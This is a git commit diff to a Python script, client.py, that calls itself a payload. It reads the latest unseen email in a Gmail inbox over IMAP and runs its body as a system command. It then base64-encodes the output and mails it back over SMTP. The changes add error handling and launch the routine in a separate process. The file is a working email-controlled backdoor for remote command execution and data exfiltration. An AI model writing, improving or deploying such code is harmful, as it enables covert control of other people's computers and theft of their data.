0fc8e239f0fffa2fc3287916c6fb7b26b5fea04c
RiadhBenlamine <riadhria03@gmail.com>
2020-07-13 21:07:59 +0100

    Improvment

--- client.py
+++ client.py
@@ -5,44 +5,62 @@ import smtplib
 import email
 import subprocess
 import base64
+import multiprocessing
 
 
 email_add = '' # Gmail of this payload
 password = '' # Password of this Gmail
-to = [''] # Gmails to send the output
+email_to = [''] # Gmails to send the output
 
 
 def mail():
-    mail = imaplib.IMAP4_SSL('imap.gmail.com')
-    mail.login(email_add, password)
+    try:
+        mail = imaplib.IMAP4_SSL('imap.gmail.com')
+        mail.login(email_add, password)
 
-    mail.select('inbox')
+        mail.select('inbox')
 
-    result, data = mail.uid('search', None, 'ALL')
+        result, data = mail.uid('search', None, 'UnSeen')
 
-    latest_email_uid = data[0].split()[-1]
-    result, data = mail.uid('fetch', latest_email_uid, '(RFC822)')
-    raw_email = data[0][1]
-    msg = email.message_from_bytes(raw_email)
-    hdr = email.header.make_header(email.header.decode_header(msg['Subject']))
-    subject = str(hdr)
+        latest_email_uid = data[0].split()[-1]
+        result, data = mail.uid('fetch', latest_email_uid, '(RFC822)')
+        raw_email = data[0][1]
+        msg = email.message_from_bytes(raw_email)
+        hdr = email.header.make_header(email.header.decode_header(msg['Subject']))
+        subject = str(hdr)
 
-    for part in msg.walk():
-        body = part.get_payload(decode=True)
-        if body is not None:
-            break
-    return body.decode()
+        for part in msg.walk():
+            body = part.get_payload(decode=True)
+            if body is not None:
+                break
+        return body.decode()
+    except Exception or IndexError:
+        return 0
 
 def send(data):
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(email_add, password)
-    server.sendmail(email_add, to, str(data).encode())
-    
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(email_add, password)
+        server.sendmail(email_add, email_to, str(data).encode())
+    except:
+        pass
 
-command = mail().replace('\r', '').replace('\n', '')
+def main():
+    command = mail()
+    if isinstance(command, str):
+        try:
+            command = command.replace('\r', '').replace('\n', '')
+            command_output = subprocess.run(command.split(" "), stdout=subprocess.PIPE).stdout.decode('utf-8')
+            text = f"Output: {command_output}"
+            payload = base64.b64encode(text.encode())
+            send(payload)
 
-dd = subprocess.run(command.split(" "), stdout=subprocess.PIPE).stdout.decode('utf-8')
-text = f"Output: {dd}"
-d = base64.b64encode(text.encode())
-send(d)
+        except FileNotFoundError:
+            pass
+    else:
+        pass
+
+if __name__ == '__main__':
+    proc_one = multiprocessing.Process(target=main)
+    proc_one.start()
